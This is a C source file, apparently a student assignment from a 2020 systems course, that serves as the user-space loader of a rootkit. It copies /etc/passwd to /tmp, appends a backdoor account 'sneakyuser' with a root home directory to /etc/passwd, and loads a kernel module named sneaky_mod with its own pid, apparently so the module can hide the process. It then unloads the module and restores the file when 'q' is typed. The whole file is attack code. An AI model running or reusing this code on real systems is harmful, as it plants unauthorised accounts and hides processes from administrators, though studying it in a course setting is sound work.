//
//  sneaky_process.c
//  650-P5
//
//  Created by Kaidi Lyu on 4/9/20.
//  Copyright © 2020 Kaidi Lyu. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    // Step 1
    int pid = getpid();
    printf("sneaky_process pid = %d\n", pid);
    
    // Step 2
    FILE* readFile = fopen("/etc/passwd", "a+");
    FILE* writeFile = fopen("/tmp/passwd", "w");
    if (readFile == NULL || writeFile == NULL) {
        perror("Fail to open target file");
        return EXIT_FAILURE;
    }
    // Copy content into /tmp/passwd from /etc/passwd
    char content;
    while ((content = fgetc(readFile)) != EOF) {
        fputc(content, writeFile);
    }
    // Add sneaky user into /etc/passwd
    char* sneakyuser = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
    fputs(sneakyuser, readFile);
    // Close open files
    fclose(readFile);
    fclose(writeFile);
    
    // Step 3
    char load[1024];
    sprintf(load, "insmod sneaky_mod.ko pid=%d", pid);
    system(load);
    
    // Step 4
    char loop;
    while ((loop = getchar()) != 'q') {
        continue;
    }
    
    // Step 5
    char* unload = "rmmod sneaky_mod";
    system(unload);
    
    // Step 6
    FILE* restore = fopen("/etc/passwd", "w");
    FILE* src = fopen("/tmp/passwd", "r");
    if (restore == NULL || src == NULL) {
        perror("Fail to open target file");
        return EXIT_FAILURE;
    }
    // Restore /etc/passwd from /tmp/passwd
    while ((content = fgetc(src)) != EOF) {
        fputc(content, restore);
    }
    
    fclose(restore);
    fclose(src);
    
    return EXIT_SUCCESS;
    
}
